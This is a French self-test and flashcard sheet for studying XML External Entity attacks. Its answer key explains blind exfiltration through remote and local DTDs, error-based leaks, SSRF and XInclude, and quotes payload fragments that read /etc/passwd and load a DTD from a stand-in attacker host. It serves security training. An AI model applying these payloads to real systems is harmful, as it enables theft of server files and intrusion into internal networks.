# Fiche de révision active — XML External Entity (XXE)

> **Mode d'emploi — Partie 1**
> Répondez à toutes les questions ci-dessous **sans consulter** `cours.md`, `exploitation.md` ou `cheatsheet.md`, et sans revenir en arrière une fois la lecture de la question commencée. Notez vos réponses avant de passer au corrigé. Ce n'est qu'après avoir répondu à l'ensemble des 30 questions que vous devez ouvrir la section « Corrigé ». Travailler avec les sources ouvertes fausse l'auto-évaluation et prive l'entraînement de son intérêt.

---

## 1. Comprendre

**Q1.** La cause racine d'une XXE ne se situe pas dans le langage XML lui-même. Où se situe-t-elle précisément, et pourquoi cette distinction importe-t-elle pour comprendre que le XML n'est pas intrinsèquement dangereux ?

**Q2.** Le cours rapproche la XXE d'une « confusion entre format de données et format pouvant contenir des instructions actives ». Expliquez cette confusion en une phrase, en précisant ce que l'application suppose à tort du document XML qu'elle reçoit.

**Q3.** Expliquez précisément ce que le mot-clé `SYSTEM` change dans une déclaration d'entité XML, par rapport à une entité interne classique (`<!ENTITY myentity "valeur">`), et pourquoi c'est cette capacité précise qui constitue le cœur du problème.

**Q4.** Le raisonnement méthodologique distingue trois niveaux : déclencher le comportement vulnérable, démontrer la vulnérabilité, atteindre un impact de sécurité précis. Donnez un exemple concret, pour la XXE, de ce qui distinguerait le premier niveau du second.

**Q5.** Une connexion sortante libre vers un serveur contrôlé par l'attaquant est fréquemment présente en environnement de lab. Expliquez pourquoi cette condition n'est cependant jamais obligatoire pour toute exploitation d'une XXE, en citant la variante qui s'en passe entièrement.

---

## 2. Reconnaître

**Q6.** Au-delà d'un endpoint acceptant explicitement un corps XML documenté, citez deux surfaces distinctes où un parseur XML vulnérable peut être atteint sans qu'aucune fonctionnalité XML ne soit visible côté client.

**Q7.** Une requête XML envoyée à l'application contient plusieurs champs (`productId`, `storeId`, `comment`). Pourquoi serait-il méthodologiquement insuffisant de ne tester l'injection d'entité que sur le premier champ rencontré ?

**Q8.** Une valeur XML envoyée est répercutée telle quelle dans la réponse de l'application. Pourquoi cette seule observation ne confirme-t-elle pas qu'une entité déclarée sur ce même nœud serait effectivement résolue par le parseur ?

**Q9.** Vous recevez une interaction DNS sur votre domaine de callback après injection d'une entité externe, mais aucune requête HTTP ne suit. Que pouvez-vous raisonnablement conclure de ce signal isolé, sans sur-interpréter ?

**Q10.** Une entité externe classique (`<!ENTITY xxe SYSTEM "...">`) ne produit aucune interaction OAST, mais une entité paramètre (`<!ENTITY % xxe SYSTEM "..."> %xxe;`) en produit une. Que révèle cette différence sur la protection en place, et quelle conséquence pratique en tirer pour la suite du test ?

---

## 3. Tester

**Q11.** Décrivez la démarche de test de détection in-band d'une XXE classique, en précisant pourquoi un résultat négatif sur un nœud donné ne permet jamais de conclure à l'absence de vulnérabilité sur l'ensemble du document.

**Q12.** Décrivez la méthodologie de détection d'une Blind XXE par OAST, en précisant pourquoi il faut systématiquement tester à la fois la syntaxe d'entité classique et la syntaxe d'entité paramètre avant de conclure.

**Q13.** Décrivez le principe de construction d'un payload de Blind XXE par message d'erreur, en expliquant quelle condition précise (indépendante de toute connexion réseau) doit être vérifiée avant de tenter cette technique.

**Q14.** Décrivez la mécanique complète de l'exfiltration via DTD malveillant hébergé à distance, en identifiant le rôle de chacune des trois entités paramètre combinées dans le DTD.

**Q15.** Décrivez la démarche de test de la variante XInclude, en précisant la condition structurelle du point d'entrée qui rend cette technique nécessaire plutôt que l'injection classique d'un `DOCTYPE`.

---

## 4. Interpréter

**Q16.** L'injection d'un `DOCTYPE`, même totalement vide de toute entité externe, provoque un rejet systématique du document par l'application. Que pouvez-vous en déduire sur la nature du blocage, et quelle technique reste pertinente à tester malgré ce rejet ?

**Q17.** Une entité externe pointant vers un domaine de callback produit une interaction DNS mais jamais de requête HTTP complète, de façon reproductible sur plusieurs tentatives. Formulez l'hypothèse la plus probable expliquant cette limitation, sans conclure à une absence totale de vulnérabilité.

**Q18.** Un DTD distant est confirmé comme chargé (une requête initiale est bien reçue sur votre serveur), mais la requête d'exfiltration finale contenant le fichier ciblé n'arrive jamais, ou arrive tronquée. Quelle cause devez-vous envisager en priorité, et quel test de diagnostic simple permettrait de la confirmer ?

**Q19.** Un message d'erreur générique, sans aucun détail technique, est retourné après l'injection d'une entité censée provoquer une erreur révélatrice. Que pouvez-vous en déduire sur la configuration de l'application, et quelle famille de techniques reste pertinente malgré cet échec ?

**Q20.** Les entités externes classiques fonctionnent et sont résolues avec succès sur un point d'entrée donné, mais une tentative XInclude sur le même point d'entrée échoue sans aucun effet. Pourquoi ce résultat n'est-il pas contradictoire, et que devez-vous en conclure sur la configuration du parseur ?

---

## 5. Exploiter

**Q21.** Construisez la chaîne de raisonnement complète permettant de lire un fichier local contenant des caractères spéciaux XML (`<`, `>`, `&`) via une XXE classique in-band, en précisant la technique nécessaire pour éviter une erreur de parsing lors de la substitution de l'entité.

**Q22.** Construisez la chaîne d'exploitation d'un SSRF via XXE, en distinguant précisément la démarche à suivre selon que le résultat de la requête interne est réintégré dans la réponse ou totalement invisible, et en précisant pourquoi tester d'abord un domaine de callback est préférable à cibler directement une adresse interne devinée.

**Q23.** Construisez la chaîne de raisonnement complète de l'exfiltration par message d'erreur, en expliquant le rôle de la construction d'un chemin de fichier délibérément inexistant dans ce mécanisme.

**Q24.** Construisez la chaîne d'exploitation complète de l'exfiltration via DTD distant pour un fichier cible simple sur une seule ligne, depuis l'hébergement du DTD malveillant jusqu'à la réception de la donnée exfiltrée, en précisant pourquoi ce choix de fichier n'est pas arbitraire.

**Q25.** Construisez le raisonnement complet de la technique de DTD local (dernier recours), en expliquant précisément quelle subtilité de la spécification XML (DTD purement interne vs DTD hybride) rend cette technique possible là où une DTD interne simple échouerait.

---

## 6. Déboguer et transférer

**Q26.** Un `DOCTYPE` provoque un rejet systématique du document, y compris lorsqu'il ne contient aucune entité externe. Quel test de diagnostic simple permet d'isoler si ce blocage cible spécifiquement les entités externes ou le `DOCTYPE` dans son ensemble, et quelle conséquence cela a-t-il sur la suite de la démarche ?

**Q27.** Les quatre approches Blind (OAST, erreur, DTD distant, DTD local) échouent toutes sur un point d'entrée donné. Avant de documenter une protection robuste sur ce point d'entrée, quelles vérifications indépendantes restent nécessaires ?

**Q28.** Le parseur XML principal de l'application résiste à toute tentative de XXE, mais une fonctionnalité d'upload de fichiers SVG traitée séparément s'avère vulnérable. Pourquoi ce résultat n'est-il pas une contradiction, et quelle leçon méthodologique en tirer pour l'audit de toute application traitant plusieurs formats basés sur un même langage sous-jacent ?

**Q29.** Le principe « une application suppose à tort qu'un format reçu ne contient que des données, alors que le format sous-jacent peut embarquer des instructions actives » est au cœur du raisonnement XXE. Formulez ce principe de façon suffisamment générale pour l'appliquer à une classe de vulnérabilité différente, avec un exemple concret.

**Q30.** La discipline des trois niveaux de preuve (comportement déclenché, vulnérabilité démontrée, impact précis atteint) structure toute la méthodologie XXE. Transférez cette discipline à l'audit d'une autre vulnérabilité aveugle par nature (au choix, hors XXE) : donnez un exemple concret de ce que seraient, dans ce nouveau contexte, les trois niveaux, et expliquez pourquoi les confondre serait une erreur.

---

## Corrigé — Réponses attendues et raisonnement

**R1.** La cause racine se situe dans le **comportement par défaut de nombreuses bibliothèques d'analyse XML**, qui autorisent la résolution d'entités externes (et parfois XInclude) sans que l'application en ait réellement besoin — c'est une question de **configuration du parseur**, pas une propriété intrinsèque du langage XML. Cette distinction importe car elle signifie que le défaut est corrigeable sans renoncer au XML lui-même : configurer correctement le parseur (section 10 du cours) élimine la vulnérabilité sans changer le format de données utilisé par l'application.

**R2.** L'application suppose à tort que le document XML qu'elle reçoit est un simple format de sérialisation de données (comme s'il ne contenait que des valeurs), alors que la spécification XML complète autorise ce document à embarquer des instructions actives interprétées par le parseur sous-jacent — déclarations d'entités, inclusions — que l'application n'a jamais prévu d'utiliser mais que le parseur traite malgré tout comme légitimes.

**R3.** Une entité interne classique déclare une valeur statique directement dans le document (`<!ENTITY myentity "valeur">`), sans jamais sortir du document lui-même. Le mot-clé `SYSTEM` transforme cette déclaration de donnée en **instruction de chargement d'une ressource extérieure** (fichier local via `file://`, ou ressource réseau via `http://`) : la valeur de l'entité n'est plus écrite dans le document, elle est récupérée dynamiquement au moment de la résolution. C'est cette capacité précise — transformer une déclaration apparemment inoffensive en instruction de lecture de fichier ou de requête réseau — qui constitue le cœur du problème, car elle donne à l'attaquant un levier d'action sur le système au-delà du simple document XML.

**R4.** Exemple concret : déclencher le comportement vulnérable correspond à obtenir, via une sonde OAST, une simple interaction DNS confirmant que le parseur a tenté de résoudre l'entité externe, sans qu'aucune donnée ne soit lue ni aucun fichier accédé. Démontrer la vulnérabilité correspond à une étape supplémentaire — obtenir une preuve exploitable et reproductible de cette résolution (par exemple une interaction DNS **et** HTTP complète, confirmant une connexion réseau effective et non une simple tentative de résolution de nom) — sans pour autant avoir encore extrait le contenu d'un fichier précis.

**R5.** Cette condition n'est jamais obligatoire car la variante de **réutilisation d'un DTD local** (section 7.5 du cours) permet d'exploiter une Blind XXE par message d'erreur en s'appuyant sur un fichier DTD déjà présent sur le système cible, sans nécessiter la moindre connexion sortante ni la moindre ressource hébergée par l'attaquant — elle exploite une subtilité de la spécification XML (redéfinition d'entité autorisée dans un DTD hybride) entièrement locale au système ciblé.

**R6.** Deux surfaces possibles parmi : (1) une fonctionnalité d'**upload de fichiers** embarquant eux-mêmes du XML (SVG, DOCX, formats bureautiques basés sur XML), traité côté serveur sans qu'aucune requête XML explicite ne soit jamais envoyée par l'attaquant ; (2) un endpoint n'exposant normalement **aucune fonctionnalité XML visible** (utilisant des formulaires classiques ou du JSON), mais acceptant malgré tout un corps XML si le `Content-Type` de la requête est modifié en conséquence, sans que cela soit documenté côté client.

**R7.** Chaque valeur XML réutilisée par l'application constitue une **surface potentielle distincte** : le fait qu'un nœud donné (par exemple `productId`) ne réutilise pas la valeur résolue dans la réponse ne dit rien sur le comportement d'un autre nœud du même document (par exemple `comment`). Une requête XML contenant plusieurs champs offre donc potentiellement plusieurs canaux de retour indépendants, et s'arrêter au premier échec risquerait de conclure à tort à l'absence de XXE in-band alors qu'un autre nœud du même document pourrait parfaitement réintégrer la valeur résolue.

**R8.** Un comportement de réflexion peut être un **simple echo de donnée** effectué par la couche applicative, totalement indépendant du parseur XML et de sa résolution effective d'entités — l'application peut très bien afficher la valeur brute reçue sans que celle-ci ait transité par une résolution d'entité réelle. Il reste donc à démontrer qu'une entité réellement déclarée sur ce nœud est effectivement résolue par le parseur (et non simplement ignorée ou traitée comme texte littéral) avant de considérer ce nœud comme un canal de retour confirmé.

**R9.** Vous pouvez raisonnablement conclure que le parseur a probablement **tenté une résolution de nom** (DNS) pour l'entité externe déclarée, mais que la connexion HTTP complète n'a pas été établie — signal plus faible qu'une interaction DNS et HTTP combinée. Il serait prématuré de conclure à une résolution complète et fiable de l'entité externe sur cette seule base : ce signal confirme une tentative, pas nécessairement une capacité de résolution et d'exfiltration via HTTP.

**R10.** Cette différence révèle un **filtrage actif ciblant spécifiquement la syntaxe d'entité classique**, sans affecter la syntaxe d'entité paramètre — certains parseurs ou protections ne traitent pas les deux syntaxes de la même manière. Conséquence pratique : il faut utiliser la syntaxe d'entité paramètre pour l'ensemble de la suite de la démarche, puisque les techniques d'exfiltration suivantes (message d'erreur, DTD distant, DTD local) reposent elles-mêmes sur des constructions d'entités paramètre — cette information oriente directement le choix de syntaxe pour toutes les étapes ultérieures.

**R11.** Démarche : injecter un `DOCTYPE` déclarant une entité externe `SYSTEM "file:///etc/passwd"`, puis référencer cette entité (`&xxe;`) successivement sur **chaque nœud XML identifié comme réutilisé dans la réponse** (pas uniquement le premier testé), en comparant le contenu obtenu à la référence légitime pour chaque nœud. Un résultat négatif sur un nœud donné ne permet jamais de conclure à l'absence de vulnérabilité sur l'ensemble du document car chaque valeur réutilisée est une surface indépendante : le nœud testé peut simplement ne pas être celui que l'application réintègre dans sa réponse, sans que cela dise quoi que ce soit sur les autres nœuds du même document.

**R12.** Méthodologie : injecter une entité externe classique pointant vers un domaine de callback contrôlé, observer les interactions reçues ; si aucune interaction n'est observée alors qu'un filtrage est suspecté, tester la même cible via une **entité paramètre** (`<!ENTITY % xxe SYSTEM "..."> %xxe;`). Il faut systématiquement tester les deux syntaxes car certains filtres ou protections ne traitent pas les entités classiques et les entités paramètre de la même manière : un échec sur l'une ne permet aucune conclusion sur l'autre, et une confirmation via l'entité paramètre après l'échec de l'entité classique est elle-même une information précieuse (filtrage actif détecté) pour orienter les techniques suivantes.

**R13.** Principe : construire, via des entités paramètre combinées, une tentative de chargement d'un **chemin de fichier délibérément inexistant** intégrant dynamiquement le contenu du fichier réellement recherché, de sorte que le message d'erreur résultant de cette tentative de chargement échouée révèle ce contenu. Condition indépendante de toute connexion réseau à vérifier avant de tenter cette technique : que les **messages d'erreur du parseur soient effectivement exposés au client** (vérifiable via le comportement de référence établi sur une entrée invalide anodine) — sans cette visibilité, la technique est structurellement inapplicable quel que soit le reste de la configuration.

**R14.** Rôle de chacune des trois entités paramètre : (1) une première entité (`%file`) charge le contenu du fichier ciblé depuis le système local via `file://` ; (2) une seconde entité (`%eval`), construite dynamiquement, déclare une **nouvelle entité** intégrant la valeur de la première dans une URL destinée au serveur de l'attaquant — ce mécanisme de construction dynamique (« eval ») est nécessaire car une entité paramètre ne peut normalement pas être directement intégrée dans la valeur `SYSTEM` d'une autre sans cette étape intermédiaire ; (3) une troisième entité (`%exfil`), issue de cette déclaration dynamique, déclenche effectivement la requête réseau vers le serveur de l'attaquant, transmettant ainsi le contenu du fichier concaténé dans l'URL interrogée.

**R15.** Condition structurelle : le point d'entrée ne permet à l'attaquant de contrôler qu'un **fragment** du document XML (une valeur insérée par l'application dans un document qu'elle construit par ailleurs), sans jamais lui donner accès à l'en-tête du document — or un `DOCTYPE` doit impérativement apparaître en tête de document pour être syntaxiquement valide, ce qui rend son injection structurellement impossible dans ce contexte. XInclude, mécanisme entièrement indépendant de toute déclaration DTD, peut être inséré directement dans le fragment contrôlé pour inclure le contenu d'une ressource externe sans jamais nécessiter de `DOCTYPE`.

**R16.** Vous pouvez en déduire que le blocage cible probablement le **`DOCTYPE` dans son ensemble** (fonctionnalité désactivée au niveau du parseur ou filtrée en amont), plutôt que spécifiquement la résolution d'entités externes — un rejet qui se produit même sans entité externe déclarée ne peut pas être attribué à un filtrage ciblant les entités elles-mêmes. Technique restant pertinente malgré ce rejet : **XInclude**, qui ne dépend pas d'un `DOCTYPE` et reste donc totalement indépendant de ce blocage précis.

**R17.** Hypothèse la plus probable : une **restriction réseau** limite les connexions sortantes du serveur à la résolution DNS seule, sans autoriser l'établissement d'une connexion TCP/HTTP complète vers l'extérieur — un comportement réseau cohérent et reproductible. Il ne faut pas conclure à une absence totale de vulnérabilité : la résolution de l'entité externe reste confirmée (le parseur tente bien la résolution), seule l'exfiltration via ce canal réseau précis est limitée — d'autres techniques indépendantes de la connexion HTTP sortante (messages d'erreur, DTD local) restent à tester.

**R18.** Cause à envisager en priorité : le fichier ciblé contient probablement des **caractères spéciaux ou des retours à la ligne** incompatibles avec une transmission correcte dans une URL — limite technique connue et documentée de ce canal précis. Test de diagnostic simple : retester la même technique avec un fichier connu comme simple et tenant sur une seule ligne (par exemple `/etc/hostname`) ; si ce fichier simple s'exfiltre correctement, la limite est confirmée comme liée au contenu du fichier plutôt qu'à un échec de principe de la technique elle-même.

**R19.** Vous pouvez en déduire que l'application **masque probablement les erreurs de parsing au client**, comportement typique d'une configuration de production où les détails techniques des exceptions ne sont jamais exposés. Famille de techniques restant pertinente malgré cet échec : les techniques **indépendantes de la visibilité des messages d'erreur**, à savoir l'OAST (si une connexion sortante est disponible) ou le DTD distant — ces mécanismes ne dépendent à aucun moment de l'affichage d'un message d'erreur détaillé.

**R20.** Ce résultat n'est pas contradictoire car XInclude est une **fonctionnalité entièrement distincte** de la résolution d'entités externes classiques, devant être explicitement prise en charge et activée séparément par le parseur — la désactivation ou l'activation de l'une n'implique rien sur l'état de l'autre. Vous devez en conclure que ce parseur précis résout les entités externes classiques mais **n'a pas XInclude activé** (ou ne le supporte pas), ce qui constitue une information de configuration distincte à documenter séparément, sans remettre en cause la résolution d'entités confirmée par ailleurs.

**R21.** Chaîne complète : (1) confirmer que le parseur résout les entités externes sur ce point d'entrée (sonde initiale) ; (2) construire un DTD interne combinant quatre entités paramètre en wrapper CDATA : une première entité `%start` contenant l'ouverture `<![CDATA[`, une entité `%file` chargeant le fichier ciblé via `file://`, une entité `%end` contenant la fermeture `]]>`, et une entité `%wrapper` qui assemble dynamiquement ces trois éléments en une nouvelle déclaration d'entité `combined` ; (3) référencer `&combined;` dans le nœud ciblé. La technique nécessaire : envelopper le contenu du fichier dans une section **CDATA**, qui indique au parseur de traiter tout le contenu interne comme du texte littéral sans l'interpréter comme de la syntaxe XML — évitant ainsi qu'un caractère `<`, `>` ou `&` présent dans le fichier ne casse le parsing du document résultant.

**R22.** Si le résultat de la requête interne est réintégré dans la réponse (**retour visible**), la démarche consiste à cibler directement l'adresse interne suspectée et à observer le contenu de la ressource interne apparaître dans la réponse HTTP — confirmation directe. Si le résultat n'est jamais visible (**retour aveugle suspecté**), il faut d'abord confirmer la capacité générale de résolution d'URL du parseur en ciblant un **domaine de callback contrôlé** (OAST) plutôt qu'une adresse interne devinée : cela permet de distinguer sans ambiguïté un échec dû à l'inatteignabilité de la cible interne précise (réseau, segmentation) d'un échec dû à l'absence totale de capacité de résolution d'URL par le parseur — un domaine de callback contrôlé constitue un test plus fiable car son succès ou son échec a une seule explication possible, contrairement à un test direct sur une cible interne dont l'échec reste ambigu.

**R23.** Le rôle de la construction d'un chemin inexistant : forcer le parseur à **échouer** dans sa tentative de chargement, ce qui déclenche la génération d'un message d'erreur par le moteur XML — message qui, par construction du payload, intègre la valeur du fichier réellement recherché dans le chemin qu'il tentait de charger. Chaîne complète : (1) une entité paramètre `%file` charge le contenu du fichier réellement ciblé ; (2) une entité paramètre `%eval` construit dynamiquement une nouvelle déclaration tentant de charger un chemin délibérément invalide, dans lequel la valeur de `%file` est concaténée ; (3) la référence à cette nouvelle entité déclenche la tentative de chargement, qui échoue nécessairement (le chemin étant invalide par construction), produisant un message d'erreur contenant le chemin complet tenté — et donc le contenu du fichier recherché.

**R24.** Chaîne complète : (1) héberger, sur un serveur contrôlé par l'attaquant, un DTD malveillant combinant les trois entités paramètre (lecture du fichier, construction dynamique de l'URL d'exfiltration, déclenchement de la requête) ; (2) référencer ce DTD distant depuis le document cible via `<!DOCTYPE foo SYSTEM "http://attaquant.com/malicious.dtd">` ; (3) soumettre ce document au point d'entrée vulnérable ; (4) observer la requête HTTP entrante sur le serveur de l'attaquant, contenant le contenu du fichier concaténé dans l'URL interrogée. Le choix d'un fichier simple sur une seule ligne n'est pas arbitraire : les caractères spéciaux et les retours à la ligne présents dans un fichier multi-lignes complexe peuvent rompre la construction de l'URL d'exfiltration ou être tronqués lors de la transmission, rendant un fichier comme `/etc/hostname` structurellement plus fiable pour valider ou exploiter cette technique qu'un fichier comme `/etc/passwd` dans son intégralité.

**R25.** Subtilité exploitée : une **DTD purement interne** ne permet pas, selon la spécification XML, de déclarer une entité paramètre à l'intérieur de la valeur d'une autre entité paramètre (restriction structurelle) — ce qui empêcherait normalement la construction dynamique nécessaire à la technique de message d'erreur en l'absence de toute ressource externe. Un **DTD hybride** (combinant une référence à un DTD externe local déjà présent sur le système, via `SYSTEM "/chemin/local.dtd"`, avec des déclarations internes additionnelles) autorise en revanche certaines **redéfinitions d'entités déjà déclarées dans ce DTD local** — en redéfinissant une entité existante du DTD local pour y injecter la construction de la technique de message d'erreur (chargement d'un chemin inexistant intégrant le fichier ciblé), on parvient au même résultat que la variante par DTD distant, mais sans dépendre d'aucune ressource externe ni d'aucune connexion sortante, uniquement d'un fichier DTD déjà présent sur le système cible.

**R26.** Test de diagnostic : soumettre un `DOCTYPE` syntaxiquement valide mais **vide de toute entité externe** (ne contenant aucune déclaration `SYSTEM`), et comparer son traitement à celui d'un document totalement dépourvu de `DOCTYPE`. Conséquence : si même ce `DOCTYPE` vide est rejeté, le blocage ne cible pas spécifiquement les entités externes mais le `DOCTYPE` dans son ensemble (fonctionnalité de déclaration de type entièrement désactivée) — dans ce cas, la suite de la démarche doit se concentrer directement sur **XInclude** (étape 7), qui ne dépend à aucun moment d'un `DOCTYPE` et reste donc totalement indépendant de ce blocage.

**R27.** Vérifications indépendantes nécessaires avant de documenter une protection robuste : revérifier chaque prérequis séparément et explicitement (la connexion sortante est-elle réellement bloquée, ou seulement limitée à certains protocoles ou domaines ? les messages d'erreur sont-ils réellement masqués sur tous les scénarios testés, ou seulement sur celui testé ? un DTD local compatible a-t-il été recherché de façon exhaustive, ou seulement sur quelques chemins candidats ?) ; et, si l'application dispose de **plusieurs points d'injection XML distincts**, tester une interaction OAST sur chacun d'eux avant de conclure, un point d'injection précis pouvant être protégé tandis qu'un autre, structurellement différent, ne l'est pas.

**R28.** Ce résultat n'est pas une contradiction car un parseur sécurisé pour un usage (le parseur XML principal de l'application, correctement configuré pour refuser la résolution d'entités externes) **n'implique jamais une sécurité automatique pour un composant distinct** traitant le même type de données par une voie différente — ici, une bibliothèque de traitement SVG séparée, avec sa propre configuration par défaut, indépendante de celle configurée explicitement pour le parseur principal. Leçon méthodologique : chaque parseur XML effectivement utilisé par l'application (principal, mais aussi ceux embarqués dans des bibliothèques tierces de traitement de formats basés sur XML) doit être testé et sécurisé **indépendamment**, un résultat négatif sur l'un ne garantissant strictement rien sur les autres.

**R29.** Formulation générale : toute fonctionnalité qui traite une entrée utilisateur en supposant qu'elle ne contient que des données inertes, alors que le format ou le moteur sous-jacent est en réalité capable d'interpréter certains motifs de cette entrée comme des instructions actives, crée une surface d'injection à la frontière entre ces deux suppositions. Exemple de transfert possible (plusieurs réponses acceptées) : la désérialisation non sécurisée d'objets (Insecure Deserialization) repose sur le même principe — une application suppose qu'un flux de données sérialisé ne représente que l'état d'un objet, alors que le mécanisme de désérialisation sous-jacent peut interpréter certains motifs du flux comme des instructions de construction d'objets arbitraires, voire d'exécution de code, si l'attaquant contrôle ce flux.

**R30.** Exemple de transfert possible (plusieurs réponses acceptées, l'important étant la cohérence du raisonnement) : pour une injection de commande OS aveugle, le niveau « comportement déclenché » correspondrait à une simple interaction DNS reçue après injection d'une commande provoquant une résolution de nom (`nslookup unique-id.oast.com`), confirmant que la commande est bien interprétée par le shell sans prouver qu'une commande arbitraire complète peut être exécutée ; le niveau « vulnérabilité démontrée » correspondrait à l'exécution confirmée et reproductible d'une commande choisie par l'attaquant avec un effet observable (délai via `sleep`, ou interaction HTTP complète) ; le niveau « impact précis atteint » correspondrait à l'exécution effective d'une commande à fort impact et sa preuve vérifiée (lecture d'un fichier sensible, ou résultat d'une commande système retourné). Les confondre serait une erreur car, comme pour la XXE, une simple interaction DNS confirme seulement qu'un canal d'interprétation existe, sans garantir ni la capacité d'exécuter une commande arbitraire complète, ni l'accès effectif à une ressource sensible du système.

---

## Barème d'auto-évaluation

| Score | Signification |
|---|---|
| **0 — Bloqué** | Aucune piste de raisonnement mobilisable sans aide. |
| **1 — Avec aide** | Réponse obtenue seulement après un indice ou une reformulation de la question. |
| **2 — Autonome sur un cas connu** | Réponse correcte et complète sur un scénario déjà rencontré, sans transfert testé. |
| **3 — Transfert** | Réponse correcte, raisonnement explicite, et capacité démontrée à l'adapter à un contexte ou un scénario nouveau. |

> Le score porte autant sur la qualité et la complétude du **raisonnement** (hypothèses posées, conditions nécessaires, ce qu'il serait prématuré de conclure) que sur la **justesse de la conclusion finale**. Une bonne conclusion obtenue par un raisonnement erroné ou incomplet ne mérite pas un score de 3.

---

# Partie 2 — Cartes de révision

> 18 cartes, 3 par catégorie. Recto = question ou situation ; Verso = réponse concise et vérifiable en quelques secondes.

### Comprendre

**Carte 1**
Recto : Où se situe la cause racine d'une XXE ?
Verso : Dans la configuration du parseur XML (résolution d'entités externes autorisée par défaut), pas dans le langage XML lui-même.

**Carte 2**
Recto : Que change le mot-clé `SYSTEM` dans une déclaration d'entité ?
Verso : Il transforme une déclaration de valeur statique en instruction de chargement d'une ressource externe (fichier local ou réseau).

**Carte 3**
Recto : Citez la variante XXE qui ne nécessite aucune connexion sortante.
Verso : La réutilisation d'un DTD local (DTD hybride redéfinissant une entité du DTD système existant).

### Reconnaître

**Carte 4**
Recto : Citez deux surfaces XXE cachées au-delà d'un endpoint XML explicite.
Verso : L'upload de fichiers SVG/DOCX embarquant du XML, et la modification du `Content-Type` sur un endpoint non-XML.

**Carte 5**
Recto : Pourquoi tester l'injection d'entité sur chaque nœud XML, pas seulement le premier ?
Verso : Chaque valeur réutilisée dans la réponse est une surface distincte — un échec sur un nœud ne dit rien des autres.

**Carte 6**
Recto : Entité classique sans effet, entité paramètre produit une interaction OAST : que révèle cette différence ?
Verso : Un filtrage ciblant spécifiquement la syntaxe d'entité classique — utiliser les entités paramètre pour la suite.

### Tester

**Carte 7**
Recto : Quelle condition, indépendante du réseau, doit être vérifiée avant de tenter la technique par message d'erreur ?
Verso : Que les messages d'erreur du parseur soient effectivement exposés au client.

**Carte 8**
Recto : Quel est le rôle de l'entité paramètre `%eval` dans l'exfiltration via DTD distant ?
Verso : Construire dynamiquement une nouvelle déclaration d'entité intégrant la valeur du fichier lu dans une URL d'exfiltration.

**Carte 9**
Recto : Pourquoi XInclude est-il nécessaire quand seul un fragment du document est contrôlé ?
Verso : Un DOCTYPE doit apparaître en tête de document — impossible à injecter avec un contrôle partiel ; XInclude n'en a pas besoin.

### Interpréter

**Carte 10**
Recto : Un DOCTYPE vide de toute entité est tout de même rejeté : que tester ensuite ?
Verso : XInclude — le blocage cible le DOCTYPE en général, pas spécifiquement les entités externes.

**Carte 11**
Recto : Interaction DNS seule sans HTTP sur le domaine de callback : que probablement en déduire ?
Verso : Une restriction réseau limite la sortie à la résolution DNS — la résolution d'entité reste confirmée, l'exfiltration HTTP est limitée.

**Carte 12**
Recto : DTD distant chargé mais exfiltration tronquée : cause à tester en priorité ?
Verso : Caractères spéciaux/retours à la ligne dans le fichier — retester avec un fichier simple sur une ligne (`/etc/hostname`).

### Exploiter

**Carte 13**
Recto : Comment lire un fichier contenant `<`, `>`, `&` sans casser le parsing XML ?
Verso : Envelopper le contenu dans un wrapper CDATA construit dynamiquement via entités paramètre.

**Carte 14**
Recto : Pourquoi tester d'abord un domaine OAST avant de cibler une IP interne pour un SSRF via XXE ?
Verso : Pour distinguer sans ambiguïté un échec dû à l'inatteignabilité de la cible d'un échec dû à l'absence de résolution d'URL.

**Carte 15**
Recto : Pourquoi le DTD local fonctionne-t-il là où une DTD purement interne échoue ?
Verso : Une DTD hybride (interne + externe locale) autorise la redéfinition d'entités existantes, impossible dans une DTD purement interne.

### Déboguer et transférer

**Carte 16**
Recto : Les 4 approches Blind échouent toutes : que vérifier avant de conclure à une protection robuste ?
Verso : Chaque prérequis indépendamment (connexion réellement bloquée ? erreurs réellement masquées partout ? DTD local cherché exhaustivement ?) et les autres points d'injection XML de l'application.

**Carte 17**
Recto : Le parseur XML principal résiste, mais l'upload SVG est vulnérable : pourquoi n'est-ce pas contradictoire ?
Verso : Chaque parseur traitant du XML (principal ou bibliothèque tierce) a sa propre configuration — à tester indépendamment.

**Carte 18**
Recto : Quel principe général du raisonnement XXE se transfère à d'autres vulnérabilités ?
Verso : Un format supposé contenir seulement des données peut embarquer des instructions actives interprétées par un moteur sous-jacent (ex. désérialisation non sécurisée).

---

# Partie 3 — Organisation des révisions

## Première tentative

1. Isolez-vous des trois documents sources (`cours.md`, `exploitation.md`, `cheatsheet.md`) et répondez aux 30 questions de la Partie 1 dans l'ordre, sans retour en arrière une fois une question commencée.
2. Notez vos réponses intégralement avant toute consultation du corrigé, y compris celles dont vous êtes incertain.
3. Comparez chaque réponse au corrigé une par une, et attribuez-vous un score selon le barème (0 à 3) immédiatement après chaque comparaison.
4. Passez ensuite aux 18 cartes de la Partie 2 en les traitant comme un test minuté plutôt qu'en les relisant passivement.
5. Consignez les questions et cartes où le score est inférieur à 2 : elles constituent la base de votre session « Après correction ».

## Après correction

| Si la difficulté exprimée ressemble à… | Document à retravailler en priorité |
|---|---|
| « Je ne comprends pas pourquoi ce n'est pas un défaut du langage XML » | `cours.md` |
| « Je ne sais pas dans quel ordre tester les variantes Blind » | `exploitation.md` |
| « Je ne me souviens plus de la syntaxe exacte d'un payload ou d'un wrapper CDATA » | `cheatsheet.md` |
| « J'ai confondu une résolution confirmée avec une exfiltration effective » | `exploitation.md` (sections 3.2 et 7 — indices, faux positifs, diagnostic des échecs) |
| « Je ne sais pas comment adapter ce raisonnement à un autre contexte » | `exploitation.md` (section 10 — leçons transférables) |

## Révisions espacées

| Jour | Action |
|---|---|
| Jour 0 | Première tentative complète (questions + cartes) et correction immédiate. |
| Jour 1 | Refaire uniquement les questions et cartes scorées en dessous de 2. |
| Jour 3 | Refaire l'ensemble des 30 questions sans aide ; comparer les scores à ceux du Jour 0. |
| Jour 7 | Refaire uniquement les 18 cartes, en visant une réponse en quelques secondes chacune. |
| Jour 14 | Refaire l'ensemble complet (questions + cartes) comme un nouvel examen blanc. |
| Jour 30 | Dernière passe de consolidation, en se concentrant sur les items encore scorés en dessous de 3. |

> Ces intervalles sont indicatifs : ajustez-les selon vos scores réels — un item resté à 0 ou 1 après plusieurs passages mérite une révision plus rapprochée que ce calendrier par défaut.
